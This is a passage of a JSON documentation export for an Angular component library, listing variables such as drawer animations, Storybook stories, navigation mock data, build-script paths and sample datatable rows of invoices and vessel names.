        "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new MatDialogConfig()"
      },
      {
        "name": "Dismissable",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    props: { dismiss: action('Dismissed') },\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" [dismissable]=\"true\">Dismissable Text Content</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "drawerAnimations",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/animation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  drawerOpenAnimation,\n  overlayAnimation\n]"
      },
      {
        "name": "drawerOpenAnimation",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/animation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "trigger('drawerAnimations', [\n  state('open-left', style({ transform: 'translateX(0)', opacity: 1 })),\n  state('open-right', style({ transform: 'translateX(0)', opacity: 1 })),\n  state('openImmediate', style({ transform: 'translateX(0)', opacity: 1 })),\n  state('closedImmediate-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\n  state('closedImmediate-right', style({ transform: 'translateX(100%)', opacity: 0 })),\n  state('closed-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\n  state('closed-right', style({ transform: 'translateX(100%)', opacity: 0 })),\n  transition('open-left => closed-left', [\n    group([\n      animate('400ms ease-in-out', style({ transform: 'translateX(-100%)' })),\n      animate('1ms 400ms ease', style({ opacity: 0 }))\n    ])\n  ]),\n  transition('open-right => closed-right', [\n    group([\n      animate('400ms ease-in-out', style({ transform: 'translateX(100%)' })),\n      animate('1ms 400ms ease', style({ opacity: 0 }))\n    ])\n  ]),\n  transition('* => open-left', [\n    style({ transform: 'translateX(-100%)', opacity: 1 }),\n    animate('400ms ease-in-out')\n  ]),\n  transition('* => open-right', [\n    style({ transform: 'translateX(100%)', opacity: 1 }),\n    animate('400ms ease-in-out')\n  ]),\n])"
      },
      {
        "name": "environment",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "apps/oilmod-web/src/environments/environment.prod.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "object",
        "defaultValue": "{\n  production: true,\n}"
      },
      {
        "name": "environment",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "apps/oilmod-web/src/environments/environment.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "object",
        "defaultValue": "{\n  production: false,\n}"
      },
      {
        "name": "ERROR_LOGGER",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/error-handler/src/lib/error-handler/token.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new InjectionToken<ErrorLogger>('sto.error-logger')"
      },
      {
        "name": "FilterPanel",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "fixedColumns",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/rows.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[...columns.map(col => ({...col, flexGrow: 0})), ...columns.map(col => ({\n  ...col,\n  flexGrow: 0\n}))]"
      },
      {
        "name": "getClass",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "(width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n}"
      },
      {
        "name": "getGreeting",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "apps/oilmod-web-e2e/src/support/app.po.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "() => cy.get('h1')"
      },
      {
        "name": "glob",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/copy-assets.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require('glob')"
      },
      {
        "name": "Grouped",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
        "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>With column groups</h3>\n<div >\n<sto-datatable [groups]=\"groups\" [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>\n</div>`,\n} )"
      },
      {
        "name": "iconMap",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/theme/svg-icons.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new Map([\n  [ 'equinor', `<svg width=\"26\" height=\"30\" viewBox=\"0 0 26 30\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M3.20802 6.37778L3.20825 14.4349C3.20802 14.6738 3.32778 14.8944 3.53463 15.0135L10.5162 19.0356C10.8124 19.2063 11.1901 18.9925 11.1903 18.6506V10.5937C11.1905 10.3548 11.0632 10.1342 10.8561 10.0149L3.87479 5.99297C3.5784 5.82233 3.20847 6.03607 3.20802 6.37778ZM24.7118 0.0862991L14.6605 5.87699C14.3628 6.04851 14.1793 6.36601 14.1797 6.70972V18.3095C14.1802 18.8019 14.7239 19.1094 15.1502 18.8637L25.2017 13.0734C25.4994 12.9017 25.6716 12.5842 25.6711 12.2405L25.6714 0.640639C25.6709 0.148287 25.1383 -0.15921 24.7118 0.0862991ZM10.9237 24.7574L8.13043 26.3669C8.04778 26.4147 7.99668 26.5029 7.99668 26.5984L7.99646 29.8218C7.99646 29.9589 8.14798 30.0442 8.2664 29.976L11.0597 28.3668C11.1425 28.3192 11.1905 28.2308 11.1903 28.1355V24.9116C11.1903 24.775 11.0421 24.6895 10.9237 24.7574ZM9.29577 21.7831L5.11256 19.3625C4.98858 19.2909 4.83572 19.2909 4.71174 19.3625L0.528527 21.7831C0.351005 21.8858 0.351005 22.1419 0.528527 22.2448L4.71174 24.665C4.83572 24.737 4.98858 24.737 5.11256 24.665L9.29577 22.2448C9.47329 22.1419 9.47329 21.8858 9.29577 21.7831ZM16.0303 22.2195L17.889 23.2948C17.999 23.3586 18.1348 23.3586 18.245 23.2948L20.1035 22.2195C20.2613 22.1279 20.2613 21.9002 20.1035 21.8089L18.245 20.7335C18.1348 20.6698 17.999 20.6698 17.889 20.7335L16.0303 21.8089C15.8725 21.9002 15.8725 22.1279 16.0303 22.2195ZM14.5352 24.8077L16.3958 25.8794C16.506 25.943 16.574 26.0607 16.574 26.1881L16.5717 28.3352C16.5715 28.5174 16.3742 28.6314 16.2162 28.5405L14.3557 27.4687C14.2455 27.4052 14.18 27.287 14.18 27.1601L14.1797 25.0129C14.1797 24.831 14.3773 24.7166 14.5352 24.8077Z\" fill=\"#EB0037\"/>\n</svg>` ]\n])"
      },
      {
        "name": "items",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\n]"
      },
      {
        "name": "items",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-select-filter/item-list.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\n]"
      },
      {
        "name": "manyColumns",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/rows.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[...columns, ...columns, ...columns]"
      },
      {
        "name": "MultilineFooter",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
        "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>The table takes in a list of footer rows</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>`,\n} )"
      },
      {
        "name": "MultiSelect",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<any>",
        "defaultValue": "(args) => ( {\n  props: { ...args }, template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n  <mat-form-field class=\"sto-form__field\"\n                  floatLabel=\"always\" >\n    <mat-label>Multiselect with filter</mat-label>\n    <mat-select [multiple]=\"true\"\n                (selectionChange)=\"valueChange($event)\"\n                [value]=\"selected\">\n      <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                         [selected]=\"select?.length\"\n                         [isFilter]=\"true\"\n                         [focusIfNoValue]=\"focusIfNoValue\"\n                         [isMulti]=\"true\"\n                         (valueChanges)=\"filteredItems = filter($event, allItems)\"\n                         (selectAll)=\"selected = $event ? filteredItems :[]; selectAll($event)\"></sto-select-filter>\n      <mat-option *ngFor=\"let opt of filteredItems\"\n                  [value]=\"opt\">{{opt.name}}</mat-option>\n    </mat-select>\n  </mat-form-field>\n</mat-card>`\n} )"
      },
      {
        "name": "navigation",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "object",
        "defaultValue": "{\n  'name': 'Web applications',\n  'groups': [\n    {\n      'name': 'Application 1',\n      'items': [\n        {\n          'id': 'a11',\n          'name': 'Application 1.1',\n          'svgIcon': false,\n          'icon': 'build',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a11'\n            ]\n          }\n        },\n        {\n          'id': 'a12',\n          'name': 'Application 1.2',\n          'svgIcon': false,\n          'icon': 'attach_money',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a12'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 2',\n      'external': false,\n      'items': [\n        {\n          'id': 'a2',\n          'name': 'Application 2',\n          'svgIcon': false,\n          'icon': 'train',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a2'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 3',\n      'items': [\n        {\n          'id': 'a3',\n          'name': 'Application 3',\n          'svgIcon': false,\n          'icon': 'local_library',\n          'command': {\n            'type': 'externalLinkNewWindow',\n            'arguments': []\n          }\n        }\n      ]\n    }\n  ]\n}"
      },
      {
        "name": "NAVIGATION_HOME_ICON",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new InjectionToken<BreadcrumbConfig>('sto-home-icon')"
      },
      {
        "name": "navigationItems",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "[\n  {\n    label: 'Direct route',\n    route: [ '/', 'home' ],\n    icon: 'home'\n  },\n  {\n    label: 'Disabled',\n    route: [ '/', 'home' ],\n    icon: 'do_disturb',\n    disabled: true\n  },\n  {\n    label: 'Internal route title',\n    children: [\n      {\n        route: [ '/', 'disabled', 'route1' ],\n        disabled: true,\n        label: 'Disabled child route',\n      },\n      {\n        route: [ '/', 'route1' ],\n        label: 'Internal child route',\n      },\n      {\n        route: [ '/', 'route2' ],\n        label: 'Internal child route 2',\n      },\n      {\n        route: [ '/', 'route3' ],\n        label: 'Internal child route 3',\n      },\n      {\n        route: [ '/', 'route4' ],\n        label: 'Internal child route 4',\n      },\n      {\n        route: [ '/', 'route5' ],\n        label: 'Internal child route 5',\n      },\n      {\n        route: [ '/', 'route6' ],\n        label: 'Internal child route 6',\n      },\n    ],\n    icon: 'dashboard',\n    title: 'Dashboard'\n  },\n  {\n    label: 'External',\n    divider: 'above',\n    children: [\n      {\n        link: 'https://example.com',\n        target: '_blank',\n        label: 'Example.com',\n      }\n    ],\n    icon: 'open_in_new',\n  },\n  {\n    link: '#',\n    label: 'Disabled Route',\n    children: [],\n    icon: 'do_disturb',\n    disabled: true\n  },\n] as Array<Navigation>"
      },
      {
        "name": "NormalUse",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/error-handler/src/lib/error-handler.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "NormalUse",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoDatatableComponent<Record<string, >>>",
        "defaultValue": "(args: StoDatatableComponent<Record<string, unknown>>) => {\n  return {\n    component: StoDatatableComponent,\n    props: {\n      ...args, columns: args.scrollbarH ? [ ...columns, ...columns, ...columns ] : columns,\n      rows: rows,\n      headerContextMenu: action('Header context menu'),\n      rowContextMenu: action('Row context menu'),\n      rowActivate: action('Keyboard-activation on row'),\n      select: action('Row selected'),\n      resized: action('Resize'),\n      trackBy: (index: number) => index\n    },\n  };\n}"
      },
      {
        "name": "NormalUse",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "NormalUse",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "NormalUse",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "NormalUse",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "observeWidth",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/sto-datatable/observer.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "(el: HTMLElement) => {\n  return new Observable<number>(subscriber => {\n    const cb = (entries: ResizeObserverEntry[]) => {\n      const entry = entries.find(e => e.contentRect);\n      const rect = entry?.contentRect;\n      subscriber.next(rect?.width);\n    };\n    const observer = new ResizeObserver(cb);\n    observer.observe(el);\n    return () => {\n      observer.disconnect();\n    };\n  });\n}"
      },
      {
        "name": "out",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/copy-assets.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
      },
      {
        "name": "out",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/build-scss.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
      },
      {
        "name": "overlayAnimation",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/lib/animation.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "trigger('overlay', [\n  transition(':enter', [\n    style({ opacity: 0 }),\n    animate('400ms', style({ opacity: 0.08 })),\n  ]),\n  transition(':leave', [\n    animate('400ms', style({ opacity: 0 }))\n  ])\n])"
      },
      {
        "name": "PADDING",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "string",
        "defaultValue": "'000000000'"
      },
      {
        "name": "Paging",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story",
        "defaultValue": "(args) => ( {\n  props: {\n    page: action('Page change'),\n    setPage: (pageEvent: { pageIndex: number; }, that: { visibleRows: { total: unknown; invoiceNo: number; voyageNo: number; vesselName: string; allocated: number; }[]; }) => {\n      const startAt = pageEvent.pageIndex * 30;\n      const endAt = ( pageEvent.pageIndex + 1 ) * 30 - 1;\n      that.visibleRows = [ ...rows ].slice(startAt, endAt);\n    },\n    ...args\n  },\n  template: `\n<h3>Paging is done by using <a href=\"https://material.angular.io/components/paginator/overview\" target=\"_blank\">mat-paginator</a></h3>\n<mat-card class=\"sto-card\" (resize)=\"resize()\">\n<sto-datatable [sortable]=\"true\" [resizeable]=\"true\" [scrollbarH]=\"true\" [virtualScroll]=\"false\" [height]=\"height\" [rows]=\"visibleRows\" [columns]=\"columns\">\n    <mat-paginator (page)=\"setPage($event, this); page($event)\" [showFirstLastButtons]=\"true\" [length]=\"rows.length\" [hidePageSize]=\"true\" [pageSize]=\"30\" [pageIndex]=\"activePage\"></mat-paginator>\n</sto-datatable>\n</mat-card>`\n} )"
      },
      {
        "name": "pipe",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/rows.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new NumberFormatPipe()"
      },
      {
        "name": "preferenceKey",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "string",
        "defaultValue": "'TOPS_IM:UserPreferences'"
      },
      {
        "name": "preferences",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Preference[]",
        "defaultValue": "[\n  { name: 'A filter', id: 'uuid', identifierKey: 'reports_filter', user: 'Bobby B', payload: {} },\n  { name: 'Another filter', id: 'uuid-2', identifierKey: 'reports_filter', user: 'Bobby B', default: true, payload: {} },\n]"
      },
      {
        "name": "primary",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "apps/oilmod-web/src/app/app.component.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "() => ({\n  moduleMetadata: {\n    imports: []\n  },\n  props: {\n  }\n})"
      },
      {
        "name": "Primary",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"primary\" [dismissable]=\"false\" icon=\"info\">Primary Text Content</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "promises",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/build-scss.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  processScss('./libs/core/src/ngx-stoui.scss', path.join(out, 'ngx-stoui.css')),\n  processScss('./libs/core/src/style/datatable/ngx-datatable.scss', path.join(out, 'ngx-datatable.css')),\n]"
      },
      {
        "name": "require",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "any"
      },
      {
        "name": "require",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "any"
      },
      {
        "name": "require",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/error-handler/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "any"
      },
      {
        "name": "require",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "any"
      },
      {
        "name": "require",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "any"
      },
      {
        "name": "require",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "any"
      },
      {
        "name": "ResponsiveMode",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story",
        "defaultValue": "(args) => ( {\n  props: args,\n  styles: [\n    `.container {\n      transition: width 300ms linear;\n    }`\n  ],\n  template: `\n<h3>Responsive mode will make the grid break into a list, allowing for a simpler view</h3>\n<div class=\"container\" [style.width.px]=\"emulateSmallElement ? breakpoint - 1 : 1000\">\n<sto-datatable [virtualScroll]=\"true\"\n[responsiveBreakPoint]=\"breakpoint\"\n[responsive]=\"true\"\n[responsiveView]=\"responsive\"\n[height]=\"400\"\n[rows]=\"rows\"\n[columns]=\"columns\"></sto-datatable>\n<ng-template #responsive let-row=\"row\"><span [matTooltip]=\"row | json\">{{ row | json }}</span></ng-template>\n</div>`\n} )"
      },
      {
        "name": "root",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/copy-assets.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "path.join(__dirname, '../../')"
      },
      {
        "name": "root",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "tools/scripts/build-scss.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "path.join(__dirname, '../../')"
      },
      {
        "name": "rows",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/rows.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "[\n  {\n    'invoiceNo': 212666588,\n    'voyageNo': 16206,\n    'vesselName': 'False Cloak Fern',\n    'allocated': 486958,\n    'total': 367817\n}, {\n    'invoiceNo': 209381561,\n    'voyageNo': 16897,\n    'vesselName': 'Weak Signalgrass',\n    'allocated': 435757,\n    'total': 306822\n}, {\n    'invoiceNo': 276445387,\n    'voyageNo': 16723,\n    'vesselName': 'Southern Red Oak',\n    'allocated': 434782,\n    'total': 304761\n}, {\n    'invoiceNo': 240525031,\n    'voyageNo': 17412,\n    'vesselName': 'Hollyleaf Buckthorn',\n    'allocated': 498118,\n    'total': 518295\n}, {\n    'invoiceNo': 208251845,\n    'voyageNo': 15732,\n    'vesselName': 'Western Sandparsley',\n    'allocated': 483548,\n    'total': 409397\n}, {\n    'invoiceNo': 244864110,\n    'voyageNo': 15313,\n    'vesselName': 'Kern Buckwheat',\n    'allocated': 413287,\n    'total': 374936\n}, {\n    'invoiceNo': 213639557,\n    'voyageNo': 17502,\n    'vesselName': 'Greenleaf Manzanita',\n    'allocated': 478124,\n    'total': 362754\n}, {\n    'invoiceNo': 255930079,\n    'voyageNo': 15029,\n    'vesselName': 'Blue Skullcap',\n    'allocated': 464448,\n    'total': 483236\n}, {\n    'invoiceNo': 204028785,\n    'voyageNo': 17325,\n    'vesselName': 'Coca',\n    'allocated': 412084,\n    'total': 319574\n}, {\n    'invoiceNo': 215898267,\n    'voyageNo': 17556,\n    'vesselName': 'Fendler\\'s Pennycress',\n    'allocated': 467666,\n    'total': 401105\n}, {\n    'invoiceNo': 283652560,\n    'voyageNo': 16693,\n    'vesselName': 'Densespike Blazing Star',\n    'allocated': 428117,\n    'total': 422318\n}, {\n    'invoiceNo': 261627486,\n    'voyageNo': 16742,\n    'vesselName': 'Texas Crab Apple',\n    'allocated': 445829,\n    'total': 389401\n}, {\n    'invoiceNo': 224657257,\n    'voyageNo': 17344,\n    'vesselName': 'Philodendron',\n    'allocated': 439503,\n    'total': 197357\n}, {\n    'invoiceNo': 287799672,\n    'voyageNo': 18559,\n    'vesselName': 'Knife Acacia',\n    'allocated': 457225,\n    'total': 152586\n}, {\n    'invoiceNo': 249855102,\n    'voyageNo': 17210,\n    'vesselName': 'Catnip Noseburn',\n    'allocated': 490793,\n    'total': 295054\n}, {\n    'invoiceNo': 217932979,\n    'voyageNo': 18294,\n    'vesselName': 'Brickellbush Goldenweed',\n    'allocated': 476987,\n    'total': 90357\n}, {\n    'invoiceNo': 287187542,\n    'voyageNo': 18123,\n    'vesselName': 'Threecornerjack',\n    'allocated': 436103,\n    'total': 98431\n}, {\n    'invoiceNo': 277359566,\n    'voyageNo': 17549,\n    'vesselName': 'Longleaf Isodendrion',\n    'allocated': 456456,\n    'total': 292117\n}, {\n    'invoiceNo': 250935681,\n    'voyageNo': 16429,\n    'vesselName': 'Purple False Gilyflower',\n    'allocated': 465653,\n    'total': 396830\n}, {\n    'invoiceNo': 261927204,\n    'voyageNo': 16524,\n    'vesselName': 'Nevada Pea',\n    'allocated': 411190,\n    'total': 393332\n}, {\n    'invoiceNo': 203826163,\n    'voyageNo': 17608,\n    'vesselName': 'Alaska Tall Bluebells',\n    'allocated': 487745,\n    'total': 273514\n}, {\n    'invoiceNo': 253006185,\n    'voyageNo': 17795,\n    'vesselName': 'Cupped Monolopia',\n    'allocated': 491265,\n    'total': 117277\n}, {\n    'invoiceNo': 212369622,\n    'voyageNo': 17867,\n    'vesselName': 'Small Rocklettuce',\n    'allocated': 408880,\n    'total': 530690\n}, {\n    'invoiceNo': 259555515,\n    'voyageNo': 16488,\n    'vesselName': 'Torchwood',\n    'allocated': 428843,\n    'total': 63208\n}, {\n    'invoiceNo': 209064476,\n    'voyageNo': 17957,\n    'vesselName': 'Saline Saltbush',\n    'allocated': 452602,\n    'total': 144560\n}, {\n    'invoiceNo': 246761266,\n    'voyageNo': 18253,\n    'vesselName': 'White Snakeroot',\n    'allocated': 485075,\n    'total': 133101\n}, {\n    'invoiceNo': 277989052,\n    'voyageNo': 15535,\n    'vesselName': 'Bayberry',\n    'allocated': 411595,\n    'total': 549473\n}, {\n    'invoiceNo': 246327302,\n    'voyageNo': 17427,\n    'vesselName': 'China Violet',\n    'allocated': 426753,\n    'total': 406017\n}, {\n    'invoiceNo': 225951335,\n    'voyageNo': 15473,\n    'vesselName': 'Olympic Saxifrage',\n    'allocated': 429650,\n    'total': 413380\n}, {\n    'invoiceNo': 206579573,\n    'voyageNo': 17600,\n    'vesselName': 'False Sun-rose',\n    'allocated': 464983,\n    'total': 474611\n}, {\n    'invoiceNo': 243806520,\n    'voyageNo': 15148,\n    'vesselName': 'Bracted Lousewort',\n    'allocated': 486907,\n    'total': 419416\n}, {\n    'invoiceNo': 248037555,\n    'voyageNo': 16554,\n    'vesselName': 'Beach Strawberry',\n    'allocated': 446762,\n    'total': 543982\n}, {\n    'invoiceNo': 233807782,\n    'voyageNo': 18251,\n    'vesselName': 'Western Bog Yellowcress',\n    'allocated': 485749,\n    'total': 206612\n}, {\n    'invoiceNo': 231399318,\n    'voyageNo': 18647,\n    'vesselName': 'Nevada Pea',\n    'allocated': 416624,\n    'total': 73797\n}, {\n    'invoiceNo': 210265421,\n    'voyageNo': 17334,\n    'vesselName': 'Silver Bird\\'s-foot Trefoil',\n    'allocated': 493556,\n    'total': 485404\n}, {\n    'invoiceNo': 270110020,\n    'voyageNo': 15750,\n    'vesselName': 'Dotted Lancepod',\n    'allocated': 